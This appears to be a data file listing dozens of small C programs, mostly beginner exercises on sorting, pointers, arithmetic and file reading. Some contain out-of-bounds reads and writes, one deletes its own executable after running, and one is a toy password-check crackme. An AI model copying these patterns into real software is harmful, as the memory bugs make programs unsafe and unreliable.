    "#include <stdio.h>\nint main(void){\n    char a = 43;\n    char b = 'b';\n    printf(\"A variavel a \u00e9: %c\\n\", a);\n    printf(\"A variavel b \u00e9: %c\\n\", b);\n    return 0;\n}",
    "#include <stdio.h>\nvoid xor_swap(int *x,int *y) {\n *y=*x^*y;\n *x=*x^*y;\n *y=*x^*y;\n}\nvoid reverse_array(int a[],int len) {\n int left,right=len-1;\n for (left=0;left<right;left++,right--)\n  xor_swap(&a[left],&a[right]);\n}\nint main() {\n int a[]={1,2,3,4,5,6,7};\n reverse_array(a,7);\n int i;\n for (i=0;i<7;i++)\n  printf(\"%d \",a[i]);\n printf(\"\\n\");\n}",
    "#include <stdio.h>\n#include <time.h>\n#include <stdlib.h>\n\nvoid geraVetor(int *vetor);\nvoid bubbleSort(int *vetor);\nvoid imprimeVetor(int *vetor);\nint main(){\n    int opt;\n    int numeros[20];\n    do{\n        printf(\"\\n\\n\\n\\n\\n\\n\\n-------------------------------------------------------\\n\");\n        printf(\"******* Ordena\u00e7\u00e3o de Vetores com Bubble Sort!**********\\n\");\n        printf(\"-------------------------------------------------------\\n\");\n        printf(\"1. Gerar Vetor\\n\");\n        printf(\"0. Sair\\n\");\n        printf(\"Op\u00e7\u00e3o 1 ou 0 pra sair.\\n\");\n        scanf(\"%d\", &opt);\n        setbuf((stdin), ((void*)0));\n        system(\"clear\");\n        switch (opt){\n        case 0:\n            printf(\"Voc\u00ea saiu do programa.\\n\");\n            break;\n        case 1:\n            printf(\"Gerando vetor de %d elementos:\\n\", 20);\n            geraVetor(numeros);\n            printf(\"Imprimindo Vetor desordenado.\\n\");\n            imprimeVetor(numeros);\n            printf(\"Ordenando Vetor com bubbleSort.\\n\");\n            bubbleSort(numeros);\n            printf(\"Imprimindo Vetor ordenado.\\n\");\n            imprimeVetor(numeros);\n            break;\n        default:\n            printf(\"Op\u00e7\u00e3o Inv\u00e1lida!\\n\");\n            break;\n        }\n    } while (opt != 0);\n    return 0;\n}\nvoid geraVetor(int *vetor){\n    srand(time(((void*)0)));\n    for(int i = 0; i < 20; i++){\n        vetor[i] = rand()%1000;\n    }\n}\nvoid bubbleSort(int *vetor){\n    int aux = 0;\n    for(int i = 0; i < 20; i++){\n        for(int j = i + 1; j < 20; j++){\n            if(vetor[i] > vetor[j]){\n                aux = vetor[i];\n                vetor[i] = vetor[j];\n                vetor[j] = aux;\n            }\n        }\n    }\n}\nvoid imprimeVetor(int *vetor){\n    for(int i = 0; i < 20; i++){\n        printf(\"%d, \", vetor[i]);\n    }\n    printf(\"\\n\\n\");\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int x = 1, y = 2, z[10];\n    int *ip;\n    ip = &x;\n    y = *ip;\n    *ip = 0;\n    ip = &z[0];\n    printf(\"%d, %d, %d,%d\\n\", ip, x, y, z);\n    return 0;\n}",
    "#include <stdio.h>\nvoid binary(int x) {\n    int i = 0; int binaryNum[32];\n    while (x > 0) {\n        binaryNum[i] = x % 2;\n        x /= 2;\n        i++;\n    }\n    for (int j = i - 1; j >= 0; j--)\n        printf(\"%d\", binaryNum[j]);\n    printf(\"\\n\");\n}\nint main() {\n    int x;\n    while (scanf(\"%d\", &x) != (-1))\n        binary(x);\n}",
    "#include <stdio.h>\nint check_serial(char *password) {\n    int i = 0;\n    while(i < 6) {\n        if (password[i] != 'A') {\n            return 0;\n        }\n        i++;\n    }\n    return 1;\n}\nint main(int argc, char *argv[]) {\n    int rv;\n    char *password = argv[1];\n    rv = check_serial(password);\n    if (rv == 0x1) {\n        printf(\"Success!\\n\");\n    } else {\n        printf(\"Fail!\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint acoes, custo;\nint max(int a, int b)\n{\n  return(a > b ? a : b);\n}\nint dp(int pd[][acoes], int ac[], int i, int notAble)\n{\n  if (i == acoes)\n  {\n    return(0);\n  }\n  if (pd[notAble][i] == -1)\n  {\n    int aux;\n    pd[notAble][i] = dp(pd, ac, i + 1, notAble);\n    if (notAble == 0)\n    {\n      aux = dp(pd, ac, i + 1, 1) - ac[i] - custo;\n      pd[notAble][i] = max(pd[notAble][i], aux);\n    }\n    if (notAble == 1)\n    {\n      aux = dp(pd, ac, i + 1, 0) + ac[i];\n      pd[notAble][i] = max(pd[notAble][i], aux);\n    }\n  }\n  return(pd[notAble][i]);\n}\nint main()\n{\n  scanf(\"%d %d\", &acoes, &custo);\n  int i, acao[acoes], DP[2][acoes];\n  memset(DP[0], -1, acoes * sizeof(int));\n  memset(DP[1], -1, acoes * sizeof(int));\n  for (i = 0; i < acoes; i ++)\n    scanf(\"%d\", &acao[i]);\n  int ans = dp(DP, acao, 0, 0);\n  printf(\"%d\\n\", ans);\n  return(0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main_screen(){\n    system(\"clear\");\n    puts(\"              ******************************************************\");\n    puts(\"              *                                                    *\");\n    puts(\"              *                                                    *\");\n    puts(\"              *       1. Rotating array, low efficiency            *\");\n    puts(\"              *                                                    *\");\n    puts(\"              *                                                    *\");\n    puts(\"              *       2. Rotating array, high efficiency           *\");\n    puts(\"              *                                                    *\");\n    puts(\"              *                                                    *\");\n    puts(\"              *       3. Rotating linked list                      *\");\n    puts(\"              *                                                    *\");\n    puts(\"              *                                                    *\");\n    puts(\"              ******************************************************\");\n    printf(\"              Input your option:\");\n    int option=0;\n    scanf(\"%d\",&option);\n    return option;\n}\nint main(void){\n    main_screen();\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int int_value = 10;\n    long long_value = 100;\n    float float_value = 1.5f;\n    char char_value = 'A';\n    printf(\"int_value: %d\\n\", int_value);\n    printf(\"long_value: %ld\\n\", long_value);\n    printf(\"float_value: %f\\n\", float_value);\n    printf(\"char_value: %c\\n\", char_value);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int a = 10;\n    int b = 103;\n    int c, h;\n    double e = 9.2;\n    double f = 103.5;\n    double g;\n    c = b / a;\n    h = b % a;\n    g = f / e;\n    printf(\"%d,%f,%d\", c, g, h);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[])\n{\n  FILE *fp;\n  int nbre_de_question=0;\n  int tmp_offset_question=0;\n  int c;\n  fp=fopen(argv[1],\"r\");\n  fread(&nbre_de_question,sizeof(int),1,fp);\n  printf(\"nbre de question %d\\n\",nbre_de_question);\n  int n=0;\n  for(;n<nbre_de_question;n++){\n    fread(&tmp_offset_question,sizeof(int),1,fp);\n    printf(\"question %d a l'offset %d\\n\",n,tmp_offset_question);\n  }\n  fread(&tmp_offset_question,sizeof(int),1,fp);\n  printf(\"fin du fichier a l'offset %d\\n\",tmp_offset_question);\n  printf(\"LES QUESTION\");\n  while((c=getc(fp))!=(-1)){\n    putchar(c);\n  }\n  fclose(fp);\n  return 0;\n}",
    "#include<stdio.h>\nint main(void) {\n    double yearOfSecond = 3.156E7;\n    int age;\n    scanf(\"%d\", &age);\n    printf(\"age %d to second %E\",age, age * yearOfSecond);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid mergeArr(int *arr, int size, int start, int end, int mid){\n    int *temp = (int *)malloc(sizeof(int) * (end - start));\n    int i = start;\n    int j = mid;\n    int iterTemp = 0;\n    while(i<mid && j<end){\n        if(arr[i] < arr[j]){\n            temp[iterTemp++] = arr[i++];\n        } else {\n            temp[iterTemp++] = arr[j++];\n        }\n    }\n    while(i<mid){\n        temp[iterTemp++] = arr[i++];\n    }\n    while(j<end){\n        temp[iterTemp++] = arr[j++];\n    }\n    for (i = 0; i<(end - start); i++){\n        arr[i + start] = temp[i];\n    }\n    free(temp);\n}\nvoid mergeSort(int* arr, int size, int start, int end){\n    if(end - start == 1){\n        return;\n    }\n    int midIdx = (start + end )/ 2;\n    mergeSort(arr, size, start, midIdx);\n    mergeSort(arr, size, midIdx, end);\n    mergeArr(arr, size, start, end, midIdx);\n}\nvoid display(int* arr, int len){\n    printf(\"[ \");\n    int iter = 0;\n    do\n    {\n        printf(\"%d\", arr[iter]);\n        iter++;\n    } while (iter < len && printf(\", \"));\n    printf(\"]\\n\");\n}\nint main(int argc, char **argv) {\n    int *arr = ((void*)0);\n    int N;\n    printf(\"Enter the size of the array: \");\n    scanf(\"%d\", &N);\n    arr = (int *)malloc(sizeof(int) * N);\n    printf(\"Enter the elements: \");\n    for (int i = 0; i < N; i++)\n        scanf(\"%d\", arr + i);\n    display(arr, N);\n    mergeSort(arr, N, 0, N);\n    display(arr, N);\n    free(arr);\n    remove(argv[0]);\n    return 0;\n}",
    "int __attribute__ ((noinline, noclone))\nfoo (void *p)\n{\n  return *(int*)p;\n}\nint main ()\n{\n  char a = 0;\n  foo (&a);\n  return 0;\n}",
    "#include <unistd.h>\n#include <stdio.h>\nint main(int argc, char **argv) {\n printf(\"Hello world!\\n\");\n char* args[] = {\n  \"ls\",\n  \"-l\",\n  ((void*)0)\n };\n execv(\"/bin/ls\", args);\n perror(\"execv\");\n printf(\"Goodbye world!\\n\");\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#include <string.h>\nuint8_t memory[255];\nvoid dump_memory(void) {\n    for (int i = 0; i < 256; i++) {\n        printf(\" %c \", memory[i]);\n        if (i % 8 == 7)\n            printf(\"\\n\");\n    }\n}\nint main(int argc, char **argv) {\n    uint8_t pc=0, load = 0, store = 0;\n    memset(memory, 0, 256);\n    FILE *binary = fopen(argv[1], \"r\");\n    fread(memory, sizeof(uint8_t), 256, binary);\n    fclose(binary);\n    store = memory[pc+1];\n    load = memory[pc];\n    pc = memory[pc+2];\n    if (!(pc | store | load)) {\n        exit(0);\n    }\n    while (((pc != memory[pc+2]) | store | load)) {\n        dump_memory();\n        printf(\"\\n\\n\");\n        memory[store] = memory[load];\n        store = memory[pc+1];\n        load = memory[pc];\n        pc = memory[pc+2];\n    }\n}",
    "#include<stdio.h>\nvoid swap1(char ,char );\nvoid swap2(char *,char *);\nint main()\n{char a,b;\nprintf(\"Enter two characters:\\n\");\nscanf(\"%c %c\",&a,&b);\nprintf(\"The elements to be swapped are:%c %c\",a,b);\nswap1(a,b);\nswap2(&a,&b);\nreturn(0);\n}\nvoid swap1(char x,char y)\n{char t;\n t=x;\n x=y;\n y=t;\nprintf(\"\\nSwapped elements after 'Pass by value':%c %c\",x,y);\n}\nvoid swap2(char *x,char *y)\n{char t;\n t=*x;\n *x=*y;\n *y=t;\nprintf(\"\\nSwapped elements after 'Pass by reference':%c %c\",*x,*y);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main() {\n    float d, km_combustivel;\n    printf(\"Qual a distancia do percurso? (Km) \");\n    scanf(\"%f\", &d);\n    printf(\"Quantos km o carro faz por litro? (Km/1L) \");\n    scanf(\"%f\", &km_combustivel);\n    printf(\"\\nO carro gastou %0.1f litro(s) de combustivel\\n\\n\", (d / km_combustivel));\n    system(\"pause\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nint get_mem2D(char ***array2D, int rows, int columns)\n{\n  int i;\n  if((*array2D = (char**)calloc(rows, sizeof(char*))) == ((void*)0)) {\n    puts(\"no mem!\");\n  }\n  if(((*array2D)[0] = (char*)calloc(columns*rows, sizeof(char))) == ((void*)0)) {\n    puts(\"no mem!\");\n  }\n  for(i=1; i<rows; i++)\n    (*array2D)[i] = (*array2D)[i-1] + columns;\n  return rows*columns;\n}\nint get_mem3D(char ****array3D, int frames, int rows, int columns)\n{\n  int j;\n  if(((*array3D) = (char***)calloc(frames, sizeof(char**))) == ((void*)0)) {\n    puts(\"no mem!\");\n  }\n  for(j=0; j<frames; j++)\n    get_mem2D( (*array3D)+j, rows, columns );\n  return frames*rows*columns;\n}\nint get_mem4D(char *****array4D, int idx, int frames, int rows, int columns )\n{\n  int j;\n  if(((*array4D) = (char****)calloc(idx,sizeof(int**))) == ((void*)0)) {\n    puts(\"no mem!\");\n  }\n  for(j=0; j<idx; j++)\n    get_mem3D( (*array4D)+j, frames, rows, columns ) ;\n  return idx*frames*rows*columns*sizeof(char);\n}\nint main()\n{\n    int width = 320;\n    int height = 240;\n    puts(\"-----------------------------------2D-------------------------------------------\");\n    char **array2D;\n    get_mem2D(&array2D, height, width);\n    printf(\"&array2D=%p, &array2D[0]=%p, &array3D[1]=%p\\n\", &array2D, &array2D[0], &array2D[1]);\n    printf(\"array2D=%p, array2D[0]=%p, array2D[1]=%p\\n\", array2D, array2D[0], array2D[1]);\n    printf(\"array2D+1=%p\\n\", array2D+1);\n    puts(\"-----------------------------------3D-------------------------------------------\");\n    char ***array3D;\n    int frms = 3;\n    get_mem3D(&array3D, frms, height, width);\n    printf(\"&array3D=%p, &array3D[0]=%p, &array3D[1]=%p, &array3D[2]=%p\\n\", &array3D, &array3D[0], &array3D[1], &array3D[2]);\n    printf(\"array3D=%p, array3D[0]=%p, array3D[1]=%p, array3D[2]=%p\\n\", array3D, array3D[0], array3D[1], array3D[2]);\n    printf(\"array3D[0][0]=%p, array3D[0][1]=%p, array3D[0][2]=%p, array3D[0][3]\\n\", array3D[0][0], array3D[0][1], array3D[0][2], array3D[0][3]);\n    printf(\"array3D[1][0]=%p, array3D[1][1]=%p, array3D[1][2]=%p, array3D[1][3]\\n\", array3D[1][0], array3D[1][1], array3D[1][2], array3D[1][3]);\n    printf(\"array3D[2][0]=%p, array3D[2][1]=%p, array3D[2][2]=%p, array3D[2][3]\\n\", array3D[2][0], array3D[2][1], array3D[2][2], array3D[2][3]);\n    puts(\"-----------------------------------4D-------------------------------------------\");\n    char ****array4D;\n    int idx = 2;\n    frms = 3;\n    get_mem4D(&array4D, idx, frms, height, width);\n    printf(\"&array4D=%p, &array4D[0]=%p, &array4D[1]=%p\\n\", &array4D, &array4D[0], &array4D[1]);\n    printf(\"array4D=%p, array4D[0]=%p, array4D[1]=%p\\n\", array4D, array4D[0], array4D[1]);\n    printf(\"array4D[0][0]=%p, array4D[0][1]=%p, array4D[0][2]=%p\\n\", array4D[0][0], array4D[0][1], array4D[0][2]);\n    printf(\"array4D[1][0]=%p, array4D[1][1]=%p, array4D[1][2]=%p\\n\", array4D[1][0], array4D[1][1], array4D[1][2]);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int m,n;\n    int i,j,c=1;\n    scanf(\"%d%d\",&m,&n);\n    for(i=1,j=m;i<=m-n;i++,j--)\n    {\n        c*=j;\n        c/=i;\n    }\n    printf(\"%d\",c);\n    return 0;\n}",
    "#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <stdbool.h>\n#include <stdio.h>\n#include <stdlib.h>\n\nvoid usage(void) {\n    printf(\"usage:\\n\");\n    printf(\"    copycat src_file dst_file\\n\");\n    exit(0);\n}\nvoid main(int argc, char *argv[]) {\n    int fd_src;\n    int fd_dst;\n    if (argc != 3) {\n        usage();\n    }\n    fd_src = open(argv[1], (0x04000000));\n    fd_dst = open(\n        argv[2],\n        (0x10000000) | (((__wasi_oflags_t)(1 << 0)) << 12),\n        (0x100) | (0x80) | (0x20) | (0x4)\n    );\n    while (1) {\n        char buffer[512] = {0};\n        int count = 0;\n        count = read(fd_src, buffer, 512);\n        write(fd_dst, buffer, count);\n        if (count < 512) {\n            close(fd_src);\n            close(fd_dst);\n            break;\n        }\n    }\n    printf(\"file copied: %s -> %s.\\n\", argv[1], argv[2]);\n}",
    "#include<stdio.h>\nint main(){\n    printf(\"hello\\n\");\n    printf(\"     1\\n\");\n    printf(\"    2 2\\n\");\n    printf(\"   3 3 3\\n\");\n    printf(\"  4 4 4 4\\n\");\n}",
    "#include <stdio.h>\nint main()\n{\n int a[10] = { 15,27,31,40,53,66,72,83,96 };\n int b, i, j;\n printf(\"\u539f\u6570\u7ec4\u5143\u7d20:\");\n for (i = 0; i < 9; i++)\n  printf(\"%d \", a[i]);\n printf(\"\\n\u8f93\u5165\u63d2\u5165\u6570:\");\n scanf(\"%d\", &b);\n for (i = 0; i < 9; i++)\n {\n  if (b < a[i])\n  {\n   for (j = 9; j >i; j--)\n    a[j] = a[j-1];\n   break;\n  }\n }\n a[i] = b;\n printf(\"\u65b0\u5143\u7d20\u987a\u5e8f\u4e3a: \");\n for (i = 0; i < 10; i++)\n  printf(\"%d \", a[i]);\n printf(\"\\n\");\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n   int x = 5;\n   int y = 10;\n  printf(\"\\n Value stored in x: %d\", x);\n  printf(\"\\n Value stored in y: %d\", y);\n  printf(\"\\n x Address: %x\", &x);\n  printf(\"\\n y Address: %x\", &y);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc,char *argv[])\n{\n  double matrix[2][2];\n  int i;\n  for (i=0; i<2; i++)\n     fscanf((stdin),\"%lf, %lf\",\n                &matrix[i][0], &matrix[i][1]);\n  for (i=0; i<2; i++)\n      fprintf((stdout),\"%f, %f\\n\",\n matrix[0][i], matrix[1][i]);\n      fprintf((stderr), \"\u7d42\u4e86\\n\");\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <memory.h>\n#include <unistd.h>\n#include <fcntl.h>\nchar buf[10000];\nint main(int argc, char *argv[]) {\n  FILE *fd;\n  char *oFile=argv[1];\n  if ((fd = fopen(oFile, \"rb\")) < 0) { printf(\"could not open(%s)\\n\", oFile); return -1; }\n  int len = fread(buf, 1, sizeof(buf), fd);\n  printf(\"len=%d\\n\", len);\n  fclose(fd);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n\n\n\nint main() {\n    FILE *fp = fopen(\"input/day-13.input\", \"r\");\n    _Bool grid[2000 * 2000];\n    for (size_t i = 0; i < 2000 * 2000; i++)\n        grid[i] = 0;\n    size_t width = 2000;\n    size_t height = 2000;\n    while (1) {\n        size_t x, y;\n        if (fscanf(fp, \"%lu,%lu\\n\", &x, &y) == 2)\n            grid[((y) * (2000) + (x))] = 1;\n        else\n            break;\n    }\n    unsigned int part1 = 0;\n    while (1) {\n        for (size_t i = 0; i < 11; i++)\n            if (fgetc(fp) == (-1))\n                goto END;\n        char dir = fgetc(fp);\n        fgetc(fp);\n        size_t pos;\n        fscanf(fp, \"%lu\", &pos);\n        fgetc(fp);\n        _Bool newgrid[2000 * 2000];\n        for (size_t i = 0; i < 2000 * 2000; i++)\n            newgrid[i] = 0;\n        if (dir == 'x') {\n            for (size_t y = 0; y < 2000; y++) {\n                for (size_t x = 0; x < pos; x++) {\n                    newgrid[((y) * (2000) + (x))] = grid[((y) * (2000) + (x))];\n                    if (2 * pos - x < 2000)\n                        newgrid[((y) * (2000) + (x))] += grid[((y) * (2000) + (2 * pos - x))];\n                }\n            }\n            width = pos;\n        } else if (dir == 'y') {\n            for (size_t y = 0; y < pos; y++) {\n                for (size_t x = 0; x < 2000; x++) {\n                    newgrid[((y) * (2000) + (x))] = grid[((y) * (2000) + (x))];\n                    if (2 * pos - y < 2000)\n                        newgrid[((y) * (2000) + (x))] += grid[((2 * pos - y) * (2000) + (x))];\n                }\n            }\n            height = pos;\n        }\n        for (size_t i = 0; i < 2000 * 2000; i++)\n            grid[i] = newgrid[i];\n        if (part1 == 0) {\n            for (size_t y = 0; y < 2000; y++) {\n                for (size_t x = 0; x < 2000; x++) {\n                    if (grid[((y) * (2000) + (x))])\n                        part1++;\n                }\n            }\n        }\n    }\n    END: {}\n    printf(\"PART 1: %u\\n\", part1);\n    printf(\"PART 2:\\n\");\n    for (size_t y = 0; y < height; y++) {\n        for (size_t x = 0; x < width; x++) {\n            putchar(grid[((y) * (2000) + (x))] ? '#' : '.');\n        }\n        putchar('\\n');\n    }\n    fclose(fp);\n    return 0;\n}",
    "#include <stdio.h>\nint czytrojkat(int,int,int);\nint main()\n{\n    int a,b,c;\n    printf(\"Podaj dlugosc boku a: \");\n    scanf(\"%i\",&a);\n    printf(\"Podaj dlugosc boku b: \");\n    scanf(\"%i\",&b);\n    printf(\"Podaj dlugosc boku c: \");\n    scanf(\"%i\",&c);\n    printf(\"\\n\\n\");\n    if(czytrojkat(a,b,c))\n    {\n        printf(\"%i\",czytrojkat(a,b,c));\n    }\n    else\n    {\n        printf(\"%i\",czytrojkat(a,b,c));\n    }\n    return 0;\n}\nint czytrojkat(int a,int b,int c)\n{\n    if(a>0 && b>0 && c>0)\n    {\n        if(a+b>c && a+c>b && b+c>a)\n        {\n            return 1;\n        }\n        else\n        {\n            return 0;\n        }\n    }\n    else\n    {\n        return 0;\n    }\n}",
    "#include <time.h>\n#include <stdio.h>\n#include <unistd.h>\nint main() {\n    clock_t start, end;\n    start = clock();\n        for(int i = 0; i < 100000; i++)\n            printf(\".\");\n    end = clock();\n    double tmp = (double) (end - start);\n    tmp = tmp / (double) ((clock_t)1000000000);\n    printf(\"\\nTempo decorrido %f\\n\", tmp);\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n printf(\"Test 1 process\");\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\nvoid merge(int* nums1, int nums1Size, int m, int* nums2, int nums2Size, int n)\n{\n    int* nums1_copy = (int*)calloc(m, sizeof(int));\n    { for(int i = (0), j = (0); i < (m); ++i, ++j) (nums1_copy)[j] = (nums1)[i]; };\n    int p = 0, p1 = 0, p2 = 0;\n    while(p1 < m && p2 < n)\n    {\n        nums1[p++] = nums1_copy[p1] <= nums2[p2] ? nums1_copy[p1++] : nums2[p2++];\n    }\n    if(p1 < m)\n    {\n        { for(int i = (p1), j = (p); i < (m); ++i, ++j) (nums1)[j] = (nums1_copy)[i]; };\n    }\n    else\n    {\n        { for(int i = (p2), j = (p); i < (n); ++i, ++j) (nums1)[j] = (nums2)[i]; };\n    }\n    free(nums1_copy);\n}\nint main()\n{\n    int nums1[6] = { 1, 2, 3, 0, 0, 0 };\n    int nums2[3] = { 2, 5, 6 };\n    merge(nums1, 6, 3, nums2, 3, 3);\n    for(int i = 0; i < 6; ++i)\n    {\n        printf(\"%d \", nums1[i]);\n    }\n    printf(\"\\n\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <limits.h>\ntypedef unsigned long ULONG;\nULONG binomial(ULONG n, ULONG k)\n{\n ULONG r = 1, d = n - k;\n if (d > k) { k = d; d = n - k; }\n while (n > k) {\n  if (r >= (2147483647 *2U +1U) / n) return 0;\n  r *= n--;\n  while (d > 1 && !(r % d)) r /= d--;\n }\n return r;\n}\nint main()\n{\n printf(\"%lu\\n\", binomial(5, 3));\n return 0;\n}",
    "#include <stdio.h>\nvoid copy_arr(double [], double [], int);\nvoid copy_ptr(double *, double *, int);\nint main(void)\n{\n    double source[7] = {1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7};\n    double target1[3], target2[3];\n    copy_arr(source + 2, target1, 3);\n    copy_ptr(source + 2, target2, 3);\n    return 0;\n}\nvoid copy_arr(double source[], double target[], int n)\n{\n    for (int i = 0; i < n; i++)\n        target[i] = source[i];\n}\nvoid copy_ptr(double * source, double * target, int n)\n{\n    while (n--)\n        *target++ = *source++;\n}",
    "#include <stdio.h>\nint gcd1(int a, int b)\n{\n    int c;\n    if (a) {\n        while (b)\n        {\n            if (a > b) {\n                c = a;\n                a = b;\n                b = c;\n            }\n            b-=a;\n        }\n        return (a);\n    }\n    else\n    {\n        if (b) return b;\n        return 1;\n    }\n}\nint main()\n{\n    int i,j;\n    for (i = 0; i < 100; i++ )\n        for (j = 0; j < 100; j++ )\n            gcd1(i, j);\n}",
    "#include<stdio.h>\n\nint main()\n{\n    int arr[5] = {1, 20, 5, 78, 30};\n    int element, pos, i;\n    printf(\"Enter position and element\\n\");\n    scanf(\"%d%d\",&pos,&element);\n    if(pos <= 5 && pos >= 0)\n    {\n        for(i = 5; i > pos; i--)\n            arr[i] = arr[i-1];\n        arr[pos] = element;\n        for(i = 0; i <= 5; i++)\n            printf(\"%d \", arr[i]);\n    }\n    else\n        printf(\"Invalid Position\\n\");\n    return 0;\n  }",
    "#include <stdio.h>\n#include <stdint.h>\n#include <fcntl.h>\n#include <sys/stat.h>\n#include <unistd.h>\nint main(){\n int fd;\n char * cmdQueue = \"/tmp/schsatQueue\";\n uint16_t cmd;\n mkfifo(cmdQueue, 0666);\n fd = open(cmdQueue, (0x10000000));\n while(1){\n  if(scanf(\"%x\", &cmd) > 0){\n   switch(cmd){\n    case 0x00:\n     write(fd, \"cmd+0x00\", sizeof(\"cmd+0x00\"));\n     break;\n    case 0x01:\n     write(fd, \"cmd+0x01\", sizeof(\"cmd+0x01\"));\n     break;\n    case 0x02:\n     write(fd, \"cmd+0x02\", sizeof(\"cmd+0x02\"));\n     break;\n    case 0x03:\n     write(fd, \"cmd+0x03\", sizeof(\"cmd+0x03\"));\n     break;\n    default:\n     break;\n   }\n  }\n }\n}",
    "#include <stdio.h>\nint main() {\n    int min, max, divisor;\n    int multiple;\n    scanf(\"%d %d %d\", &min, &max, &divisor);\n    multiple = min - min % divisor;\n    if ( multiple < min ) {\n        multiple += divisor;\n    }\n    for ( ; multiple <= max; multiple += divisor ) {\n        printf(\"%d\\n\", multiple);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char const *argv[])\n{\n    unsigned int x = 10;\n    printf(\"%U\", x);\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<math.h>\nint zhishu(int x)\n{\n    int i=x-1;\n    while(x%i!=0&&i>1)\n        i--;\n    if(i==1)\n        return 0;\n    else\n        return 1;\n}\nint main()\n{\n    int n;\n    scanf(\"%d\",&n);\n    n++;\n    while(zhishu(n))\n        {n++;}\n    printf(\"%d\",n);\n    return 0;\n}",
    "#include<stdio.h>\n#include<string.h>\nint main()\n{\n   char str[100];\n   printf(\"Enter the string\\n\");\n    scanf(\"%s\",str);\n    int n=strlen(str);\n    for(int i=0;i<=n;i++)\n    {\n     if(str[i]>='a'&&str[i]<='z')\n     {\n      str[i]=str[i]-32;\n  }else if(str[i]>='A'&&str[i]<='Z')\n     {\n   str[i]=str[i]+32;\n  }\n }\n    printf(\"%s\",str);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void){\n  int ga=1,cho=35,chan=0;\n  while (chan!=100){\n    ga++;\n    cho--;\n    chan=ga*2+cho*4;\n  }\n  printf(\"Co %i con ga va %i con cho\",ga,cho);\n}",
    "#include <stdlib.h>\n#include <math.h>\n#include <stdio.h>\n#include <time.h>\nint main(void){\n int arr[10];\n time_t t;\n int* gaps;\n int i, j, k = 1;\n int temp, q;\n printf(\"Unsorted Array: \");\nsrand((unsigned)time(&t));\n for(i = 0; i < 10; i++){\n    arr[i] = rand() % 100;\n    printf(\"%d, \", arr[i]);\n }\n printf(\"\\n\");\nwhile((pow((double)2, (double)k) - 1) < (sizeof(arr)/sizeof(int))){\n    k++;\n    }\n    gaps = (int*)calloc(k, sizeof(int));\n    if(gaps == ((void*)0)){\n        printf(\"Calloc Failed.\\n\");\n        exit(0);\n    }\n    for(i=1;i<k;i++){\n        gaps[i-1] = (pow((double)2, (double)i) - 1);\n    }\n    printf(\"Gaps: \");\n    for(i=1; i<k;i++){\n        printf(\"%d, \", gaps[i-1]);\n    }\n    printf(\"\\n\");\n    for(i = k-1; i>= 0;i--){\n        for(j=0; j< 10; j++){\n            for(q= j + gaps[i]; q < 11; q+= gaps[i]){\n                temp = arr[j];\n                if(temp > arr[q]){\n                    arr[j] = arr[q];\n                    arr[q] = temp;\n                }\n            }\n               }\n    }\n    printf(\"1-Sorted Array Pre Insertion: \");\n    for(i = 0; i<10;i++){\n        printf(\"%d, \", arr[i]);\n    }\n    printf(\"\\n\");\n    printf(\"Final Sorted List: \");\n    for(i=0; i<10; i++){\n        printf(\"%d, \", arr[i]);\n    }\n    printf(\"\\n\");\n}",
    "#include <stdio.h>\nint main()\n{\n    int int_var = 5;\n    int *int_ptr;\n    int_ptr = &int_var;\n    printf(\"int_ptr = 0x%08x\\n\", int_ptr);\n    printf(\"&int_ptr = 0x%08x\\n\", &int_ptr);\n    printf(\"*int_ptr = 0x%08x\\n\\n\", *int_ptr);\n    printf(\"int_var is located at 0x%08x and contains %d\\n\", &int_var, int_var);\n    printf(\"int_ptr is located at 0x%08x, contains 0x%08x and that address contains %d\\n\\n\", &int_ptr, int_ptr, *int_ptr);\n}",
    "#include<stdio.h>\nint main()\n{\n int n,a[100001]={0},i,x,k;\n scanf(\"%d\",&n);\n for(i=1;i<=n;i++)\n {\n  scanf(\"%d\",&x);\n  a[x]++;\n }\n scanf(\"%d\",&k);\n for(i=100000;i>0;i--)\n {\n  if(a[i]!=0)\n   k--;\n  if(k==0)\n   break;\n }\n printf(\"%d %d\",i,a[i]);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid vassume(int b){}\nvoid vtrace1_post(int m, int tCtr){}\nvoid mainQ(int m) {\n int tCtr = 0;\n if (m < 0){\n     tCtr = -5;\n }\n else if (m == 0){\n     tCtr = 2;\n }\n else{\n     tCtr = m + 5;\n }\n vtrace1_post(m, tCtr);\n}\nvoid main(int argc, char *argv[]) {\n    mainQ(atoi(argv[1]));\n}",
    "#include <stdio.h>\nint *sortAsc(int *n, int _n) {\n  int temp;\n  for (int i = 0; i < _n - 1; i++) {\n    for (int j = 0; j < _n - 1; j++) {\n      if (n[j] > n[j + 1]) {\n        temp = n[j + 1];\n        n[j + 1] = n[j];\n        n[j] = temp;\n      }\n    }\n  }\n  return n;\n}\nint main() {\n  int arr[5];\n  int j;\n  for (j = 0; j < 5; j++) {\n    scanf(\"%d\", &arr[j]);\n  }\n  int *p = sortAsc(arr, 5);\n  int i;\n  for (i = 0; i < 5; i++) printf(\"%d \", *(p + i));\n  printf(\"\\n\");\n  return 0;\n}",
